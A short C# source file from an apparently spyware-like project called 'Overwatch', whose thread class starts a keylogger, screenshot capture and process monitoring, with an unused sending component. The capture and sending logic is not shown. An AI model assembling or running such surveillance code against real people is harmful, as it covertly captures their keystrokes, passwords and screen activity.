using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;

namespace Overwatch
{
    class cThread
    {
        public static bool sending = false;
        private static cReceiveInformation info = new cReceiveInformation();
        private static cKeylogger k = new cKeylogger();
        private static cSendingInformation s = new cSendingInformation();
        private static Thread KeyThread = new Thread(k.Start);
        private static Thread ScreenThread = new Thread(info.ScreenShoot);
        
        private static Thread ProcessThread = new Thread(info.Overview);
        public void Start()
        {
            KeyThread.Start();
            ScreenThread.Start();
            ProcessThread.Start();
        }
    }
}
